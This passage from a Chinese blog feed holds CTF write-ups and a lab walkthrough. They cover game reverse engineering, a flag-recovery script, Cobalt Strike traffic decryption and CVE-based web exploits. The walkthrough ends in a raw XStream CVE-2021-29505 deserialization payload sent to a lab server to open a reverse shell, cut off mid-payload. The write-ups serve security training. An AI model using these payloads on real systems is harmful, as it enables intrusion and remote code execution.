class="keyword">do</span></span><br><span class="line">            <span class="keyword">for</span> x=<span class="number">1</span>,#hand[<span class="number">1</span>] <span class="keyword">do</span></span><br><span class="line">                <span class="keyword">if</span> hand[y][x] <span class="keyword">then</span></span><br><span class="line">                    gc_rectangle(<span class="string">&#x27;fill&#x27;</span>, (handX+x<span class="number">-2</span>)*<span class="number">40</span><span class="number">-4</span>, -(handY+y<span class="number">-1</span>)*<span class="number">40</span><span class="number">-4</span>, <span class="number">40</span>+<span class="number">8</span>, <span class="number">40</span>+<span class="number">8</span>)</span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">-- Hand</span></span><br><span class="line">        <span class="keyword">for</span> y=<span class="number">1</span>,#hand <span class="keyword">do</span></span><br><span class="line">            <span class="keyword">for</span> x=<span class="number">1</span>,#hand[<span class="number">1</span>] <span class="keyword">do</span></span><br><span class="line">                <span class="keyword">if</span> hand[y][x] <span class="keyword">then</span></span><br><span class="line">                    gc_setColor(colors[hand[y][x]])</span><br><span class="line">                    gc_rectangle(<span class="string">&#x27;fill&#x27;</span>, (handX+x<span class="number">-2</span>)*<span class="number">40</span>, -(handY+y<span class="number">-1</span>)*<span class="number">40</span>, <span class="number">40</span>, <span class="number">40</span>)</span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">-- Hold</span></span><br><span class="line">        <span class="keyword">if</span> holdSlot <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">for</span> y=<span class="number">1</span>,#holdSlot <span class="keyword">do</span></span><br><span class="line">                <span class="keyword">for</span> x=<span class="number">1</span>,#holdSlot[<span class="number">1</span>] <span class="keyword">do</span></span><br><span class="line">                    <span class="keyword">if</span> holdSlot[y][x] <span class="keyword">then</span></span><br><span class="line">                        gc_setColor(colors[holdSlot[y][x]])</span><br><span class="line">                        gc_rectangle(<span class="string">&#x27;fill&#x27;</span>, (x<span class="number">-3.5</span>-#holdSlot[<span class="number">1</span>]/<span class="number">2</span>)*<span class="number">40</span>, -(y+<span class="number">18.5</span>-#holdSlot/<span class="number">2</span>)*<span class="number">40</span>, <span class="number">40</span>, <span class="number">40</span>)</span><br><span class="line">                    <span class="keyword">end</span></span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">-- Next</span></span><br><span class="line">        <span class="keyword">for</span> i=<span class="number">1</span>,<span class="number">6</span> <span class="keyword">do</span></span><br><span class="line">            <span class="keyword">for</span> y=<span class="number">1</span>,#nextQueue[i] <span class="keyword">do</span></span><br><span class="line">                <span class="keyword">for</span> x=<span class="number">1</span>,#nextQueue[i][<span class="number">1</span>] <span class="keyword">do</span></span><br><span class="line">                    <span class="keyword">if</span> nextQueue[i][y][x] <span class="keyword">then</span></span><br><span class="line">                        gc_setColor(colors[nextQueue[i][y][x]])</span><br><span class="line">                        gc_rectangle(<span class="string">&#x27;fill&#x27;</span>, (x+<span class="number">11.5</span>-#nextQueue[i][<span class="number">1</span>]/<span class="number">2</span>)*<span class="number">40</span>,</span><br><span class="line">                            -(y+<span class="number">18.5</span>-#nextQueue[i]/<span class="number">2</span>-(i<span class="number">-1</span>)*<span class="number">2.5</span>)*</span><br><span class="line">                            <span class="number">40</span>, <span class="number">40</span>, <span class="number">40</span>)</span><br><span class="line">                    <span class="keyword">end</span></span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">local</span> pos_x,pos_y,lefttime,b2bAlpha,spikeAlpha</span><br><span class="line">    <span class="comment">--B2B</span></span><br><span class="line">    <span class="keyword">if</span> b2b &gt;= <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">        pos_x = <span class="number">-70</span></span><br><span class="line">        pos_y = <span class="number">-600</span></span><br><span class="line">        b2bAlpha = <span class="built_in">math</span>.<span class="built_in">min</span>(b2b * <span class="number">0.1</span> - <span class="number">0.3</span>,<span class="number">1</span>)</span><br><span class="line">        gc_setColor(COLOR.L)</span><br><span class="line">        FONT.set(<span class="number">30</span>)</span><br><span class="line">        gc_print(<span class="string">&quot;B2B x&quot;</span>, pos_x - <span class="number">130</span>, pos_y - <span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">        gc_setColor(<span class="number">0.626</span>,<span class="number">0</span>,<span class="number">0</span>,b2bAlpha)</span><br><span class="line">        <span class="keyword">if</span> b2b &gt;= <span class="number">4</span> <span class="keyword">then</span></span><br><span class="line">            gc_blurCircle(<span class="number">-.26</span>, pos_x, pos_y ,<span class="number">100</span> * <span class="number">1</span>)</span><br><span class="line">            gc_mDraw(chargeIcon, pos_x, pos_y, <span class="built_in">time</span> * <span class="number">2.6</span>, <span class="number">.25</span>)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        number_text:set((<span class="string">&quot;%d&quot;</span>):<span class="built_in">format</span>(b2b))</span><br><span class="line">        gc_setColor(COLOR.Y)</span><br><span class="line">        gc_mDraw(number_text, pos_x, pos_y, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">--COMBO</span></span><br><span class="line">    <span class="keyword">if</span> combo &gt;= <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">        pos_x = <span class="number">-100</span></span><br><span class="line">        pos_y = <span class="number">-550</span></span><br><span class="line">        gc_setColor(COLOR.L)</span><br><span class="line">        FONT.set(<span class="number">25</span>)</span><br><span class="line">        gc_print(<span class="string">&quot;Combo x&quot;</span>, pos_x - <span class="number">130</span>, pos_y - <span class="number">15</span>)</span><br><span class="line">        gc_setColor(COLOR.B)</span><br><span class="line">        number_text:set((<span class="string">&quot;%d&quot;</span>):<span class="built_in">format</span>(combo))</span><br><span class="line">        gc_mDraw(number_text, pos_x + <span class="number">30</span>, pos_y, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">--SPEEDCOMBO</span></span><br><span class="line">    <span class="keyword">if</span> speedcombo &gt;= <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">        pos_x = <span class="number">-100</span></span><br><span class="line">        pos_y = <span class="number">-500</span></span><br><span class="line">        gc_setColor(COLOR.L)</span><br><span class="line">        FONT.set(<span class="number">25</span>)</span><br><span class="line">        gc_print(<span class="string">&quot;Speed x&quot;</span>, pos_x - <span class="number">130</span>, pos_y - <span class="number">15</span>)</span><br><span class="line">        gc_setColor(COLOR.P)</span><br><span class="line">        </span><br><span class="line">        number_text:set((<span class="string">&quot;%d&quot;</span>):<span class="built_in">format</span>(speedcombo))</span><br><span class="line">        gc_mDraw(number_text, pos_x + <span class="number">30</span>, pos_y, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">        lefttime = <span class="built_in">math</span>.<span class="built_in">min</span>(speedcombotime - <span class="built_in">time</span>,<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">if</span> lefttime &gt;= <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">            gc_rectangle(<span class="string">&#x27;fill&#x27;</span>, pos_x - <span class="number">25</span>, pos_y + <span class="number">20</span>, lefttime * <span class="number">10</span>, <span class="number">5</span>)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">--LastAttack Spike</span></span><br><span class="line">    <span class="keyword">if</span> lastSpike &gt;= <span class="number">8</span> <span class="keyword">then</span></span><br><span class="line">        pos_x = <span class="number">-100</span></span><br><span class="line">        pos_y = <span class="number">-300</span></span><br><span class="line">        spikeAlpha = <span class="built_in">math</span>.<span class="built_in">max</span>(<span class="built_in">math</span>.<span class="built_in">min</span>(lastSpikeEndTime - <span class="built_in">time</span>,<span class="number">2.0</span>) / <span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">        gc_setColor(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,spikeAlpha)</span><br><span class="line">        <span class="keyword">if</span> lastSpike &gt;= <span class="number">10</span> <span class="keyword">then</span></span><br><span class="line">            gc_blurCircle(<span class="number">-.26</span>, pos_x, pos_y ,<span class="number">100</span> * <span class="number">1</span>)</span><br><span class="line">            gc_mDraw(chargeIcon, pos_x, pos_y, <span class="built_in">time</span> * lastSpike / <span class="number">10</span>, <span class="number">.2</span> + lastSpike / <span class="number">400</span>)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        gc_setColor(<span class="number">1.0</span>,<span class="number">0.192</span>,<span class="number">0.15</span>,spikeAlpha)</span><br><span class="line">        number_text:set((<span class="string">&quot;%d&quot;</span>):<span class="built_in">format</span>(lastSpike))</span><br><span class="line">        gc_mDraw(number_text, pos_x, pos_y, <span class="number">0</span>, <span class="number">1</span> + lastSpike / <span class="number">50</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    pos_x = <span class="number">-100</span></span><br><span class="line">    pos_y = <span class="number">-200</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">time</span> - lastAttackTime &lt; <span class="number">0.5</span> <span class="keyword">then</span></span><br><span class="line">        attackAlpha = <span class="number">1.0</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        attackAlpha = <span class="built_in">math</span>.<span class="built_in">max</span>(<span class="built_in">math</span>.<span class="built_in">min</span>((lastAttackTime + <span class="number">1.0</span> - <span class="built_in">time</span>) * <span class="number">2</span>,<span class="number">1.0</span>),<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    number_text:set((<span class="string">&quot;+%d&quot;</span>):<span class="built_in">format</span>(lastAttack))</span><br><span class="line">    gc_setColor(<span class="number">0.960</span>,<span class="number">0.545</span>,<span class="number">0</span>,attackAlpha)</span><br><span class="line">    gc_mDraw(number_text, pos_x, pos_y, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">SCN.add(<span class="string">&#x27;main&#x27;</span>, scene)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>丢给AI写脚本还原出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">KSA</span>(<span class="params">key</span>):</span><br><span class="line">    key_length = <span class="built_in">len</span>(key)</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + <span class="built_in">ord</span>(key[i % key_length])) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calcData_corrected</span>(<span class="params">text_table, secretBox, secret_i, secret_j</span>):</span><br><span class="line">    text_len = text_table[<span class="number">0</span>]</span><br><span class="line">    K = [<span class="number">0</span>] * (text_len + <span class="number">1</span>) </span><br><span class="line">    K[<span class="number">0</span>] = text_len</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, text_len + <span class="number">1</span>):</span><br><span class="line">        secret_i = (secret_i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        secret_j = (secret_j + secretBox[secret_i]) % <span class="number">256</span></span><br><span class="line">        secretBox[secret_i], secretBox[secret_j] = secretBox[secret_j], secretBox[secret_i]</span><br><span class="line">        k_index = (secretBox[secret_i] + secretBox[secret_j]) % <span class="number">256</span></span><br><span class="line">        stream_byte = secretBox[k_index]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 模256加法加密</span></span><br><span class="line">        K[n] = (text_table[n] + stream_byte) % <span class="number">256</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> K, secretBox, secret_i, secret_j</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tableToStr_corrected</span>(<span class="params">text_table</span>):</span><br><span class="line">    text_len = text_table[<span class="number">0</span>] </span><br><span class="line">    out_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, text_len + <span class="number">1</span>): </span><br><span class="line">        c = text_table[i]</span><br><span class="line">        <span class="comment"># 仅显示可打印ASCII字符</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">32</span> &lt;= c &lt;= <span class="number">126</span>:</span><br><span class="line">            out_string += <span class="built_in">chr</span>(c)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            out_string += <span class="string">&quot;#&quot;</span></span><br><span class="line">    <span class="keyword">return</span> out_string</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;Speedmino Created By MrZ and modified by zxc&quot;</span></span><br><span class="line">secretBox = KSA(key)</span><br><span class="line">secret_i = <span class="number">0</span></span><br><span class="line">secret_j = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">pass_table = [<span class="number">55</span>] + [<span class="number">32</span>] * <span class="number">55</span>  <span class="comment"># [长度=55] + 55个空格(ASCII 32)</span></span><br><span class="line">_, secretBox, secret_i, secret_j = calcData_corrected(</span><br><span class="line">    pass_table, secretBox, secret_i, secret_j</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">initial_youwillget = [</span><br><span class="line">    <span class="number">52</span>,  <span class="comment"># 长度字段</span></span><br><span class="line">    <span class="number">187</span>, <span class="number">24</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">58</span>, <span class="number">243</span>, <span class="number">176</span>, <span class="number">235</span>, <span class="number">179</span>, <span class="number">159</span>,</span><br><span class="line">    <span class="number">170</span>, <span class="number">155</span>, <span class="number">201</span>, <span class="number">23</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">210</span>, <span class="number">27</span>, <span class="number">113</span>, <span class="number">11</span>,</span><br><span class="line">    <span class="number">161</span>, <span class="number">94</span>, <span class="number">245</span>, <span class="number">41</span>, <span class="number">29</span>, <span class="number">43</span>, <span class="number">199</span>, <span class="number">8</span>, <span class="number">200</span>, <span class="number">252</span>,</span><br><span class="line">    <span class="number">86</span>, <span class="number">17</span>, <span class="number">72</span>, <span class="number">177</span>, <span class="number">52</span>, <span class="number">252</span>, <span class="number">20</span>, <span class="number">74</span>, <span class="number">111</span>, <span class="number">53</span>,</span><br><span class="line">    <span class="number">28</span>, <span class="number">6</span>, <span class="number">190</span>, <span class="number">108</span>, <span class="number">47</span>, <span class="number">16</span>, <span class="number">237</span>, <span class="number">148</span>, <span class="number">82</span>, <span class="number">253</span>,</span><br><span class="line">    <span class="number">148</span>, <span class="number">6</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">current_data = initial_youwillget</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2600</span>):</span><br><span class="line">    current_data, secretBox, secret_i, secret_j = calcData_corrected(</span><br><span class="line">        current_data, secretBox, secret_i, secret_j</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">final_message = tableToStr_corrected(current_data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;胜利后的消息:&quot;</span>, final_message)</span><br><span class="line"><span class="comment">#胜利后的消息: NepCTF&#123;You_ARE_SpeedMino_GRAND-MASTER_ROUNDS!_TGLKZ&#125;</span></span><br></pre></td></tr></table></figure><h3 id="meowble喵泡">MeowBle喵泡</h3><p><del>我甚至开CE玩通关了一遍</del></p><p>大多数flag片段都能在文件中找到，包括一些hint</p><figure><img src="/images/NepCTF2025-Writeup/image-20250727111746336.png"alt="image-20250727111746336" /><figcaption aria-hidden="true">image-20250727111746336</figcaption></figure><figure><img src="/images/NepCTF2025-Writeup/image-20250727111802903.png"alt="image-20250727111802903" /><figcaption aria-hidden="true">image-20250727111802903</figcaption></figure><figure><img src="/images/NepCTF2025-Writeup/image-20250727111834582.png"alt="image-20250727111834582" /><figcaption aria-hidden="true">image-20250727111834582</figcaption></figure><p>这里的hint指的其实就是经典的作弊代码konami代码：上上下下左右左右BA</p><p>开始游戏以后在暂停的面板这么做就能进入一个GM Mode</p><p>help命令查看帮助后得知用getflag 7获取最后一段flag</p><figure><img src="/images/NepCTF2025-Writeup/image-20250727112156294.png"alt="image-20250727112156294" /><figcaption aria-hidden="true">image-20250727112156294</figcaption></figure><h3 id="客服小美">客服小美</h3><p>一眼CS流量，给内存肯定是要dump beacon的进程</p><figure><img src="/images/NepCTF2025-Writeup/image-20250727153714802.png"alt="image-20250727153714802" /><figcaption aria-hidden="true">image-20250727153714802</figcaption></figure><p>接下来照<ahref="https://www.secrss.com/articles/35756">这篇文章</a>做就行</p><p>简单尝试后不难识别出这是cs4.x的流量。查看流量中的data，长度为68的这条大概就是密钥了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cs-parse-traffic.py -k unknown DESKTOP.pcapng</span><br></pre></td></tr></table></figure><figure><img src="/images/NepCTF2025-Writeup/image-20250727154049402.png"alt="image-20250727154049402" /><figcaption aria-hidden="true">image-20250727154049402</figcaption></figure><p>从进程中提取hmac key和aes key</p><figure><img src="/images/NepCTF2025-Writeup/image-20250727154432297.png"alt="image-20250727154432297" /><figcaption aria-hidden="true">image-20250727154432297</figcaption></figure><p>解密所有流量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cs-parse-traffic.py -k 35d34ac8778482751682514436d71e09:a6f4a04f8a6aa5ff27a5bcdd5ef3b9a7 DESKTOP.pcapng</span><br></pre></td></tr></table></figure><figure><img src="/images/NepCTF2025-Writeup/image-20250727154605970.png"alt="image-20250727154605970" /><figcaption aria-hidden="true">image-20250727154605970</figcaption></figure><p>NepCTF{JohnDoe_192.168.27.132:12580_5c1eb2c4-0b85-491f-8d50-4e965b9d8a43}</p><h2 id="web">Web</h2><h3 id="easygoogoovvvy">easyGooGooVVVY</h3><p>查到一个CVE，把里面的脚本拿来一用: <ahref="https://www.cnblogs.com/cute-puli/p/14434200.html">CVE-2015-1427</a></p><p>flag在环境变量里</p><figure><img src="/images/NepCTF2025-Writeup/image-20250727141302261.png"alt="image-20250727141302261" /><figcaption aria-hidden="true">image-20250727141302261</figcaption></figure><h3 id="revengegoogoovvvy">RevengeGooGooVVVY</h3><p>虽然不懂，但是用上题的exp一样能拿到flag（？</p><figure><img src="/images/NepCTF2025-Writeup/image-20250727141625337.png"alt="image-20250727141625337" /><figcaption aria-hidden="true">image-20250727141625337</figcaption></figure><h3 id="javaseri">JavaSeri</h3><p>shiro框架写脸上了</p><figure><img src="/images/NepCTF2025-Writeup/image-20250727142653460.png"alt="image-20250727142653460" /><figcaption aria-hidden="true">image-20250727142653460</figcaption></figure><p>shiro attack一把梭了</p><figure><img src="/images/NepCTF2025-Writeup/image-20250727142721702.png"alt="image-20250727142721702" /><figcaption aria-hidden="true">image-20250727142721702</figcaption></figure><figure><img src="/images/NepCTF2025-Writeup/image-20250727142754153.png"alt="image-20250727142754153" /><figcaption aria-hidden="true">image-20250727142754153</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> NepCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境-Delivery</title>
      <link href="/posts/71974631/"/>
      <url>/posts/71974631/</url>
      
        <content type="html"><![CDATA[<p>fscan扫一遍</p><figure><imgsrc="/images/春秋云境-Delivery/1753343088874-08d79a96-142a-4da9-8c73-8317fcc02f33.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>有匿名登陆ftp，里面有两个文件，下载下来</p><figure><imgsrc="/images/春秋云境-Delivery/1753343192478-7c2c375e-9ba1-40b8-95ba-312028325f86.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>看pom.xml，里面有xstream的依赖，根据版本可以找到对应的洞CVE-2021-29505</p><figure><imgsrc="/images/春秋云境-Delivery/1753343351275-36960fcd-462b-4745-91c8-02eb9d0daa38.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>在自己vps上监听</p><figure><imgsrc="/images/春秋云境-Delivery/1753343675117-71cd240a-4300-4b0b-b67a-0c5c7b77d694.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>传poc弹shell</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">POST /just_sumbit_it HTTP/1.1</span><br><span class="line">Host: 39.99.145.25:8080</span><br><span class="line">Content-Length: 3115</span><br><span class="line">Accept: application/xml, text/xml, */*; q=0.01</span><br><span class="line">DNT: 1</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Content-Type: application/xml;charset=UTF-8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,vi;q=0.7</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span>12345<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">m__obj</span> <span class="attr">class</span>=<span class="string">&#x27;string&#x27;</span>&gt;</span>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content<span class="tag">&lt;/<span class="name">m__obj</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span>12345<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">parsedMessage</span>&gt;</span>true<span class="tag">&lt;/<span class="name">parsedMessage</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">soapVersion</span>&gt;</span>SOAP_11<span class="tag">&lt;/<span class="name">soapVersion</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bodyParts</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">sm</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">attachmentsInitialized</span>&gt;</span>false<span class="tag">&lt;/<span class="name">attachmentsInitialized</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nullIter</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">aliases</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&#x27;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">candidates</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.jndi.rmi.registry.BindingEnumeration&#x27;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">names</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">ctx</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">environment</span>/&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">registry</span> <span class="attr">class</span>=<span class="string">&#x27;sun.rmi.registry.RegistryImpl_Stub&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">java.rmi.server.RemoteObject</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">string</span>&gt;</span>UnicastRef<span class="tag">&lt;/<span 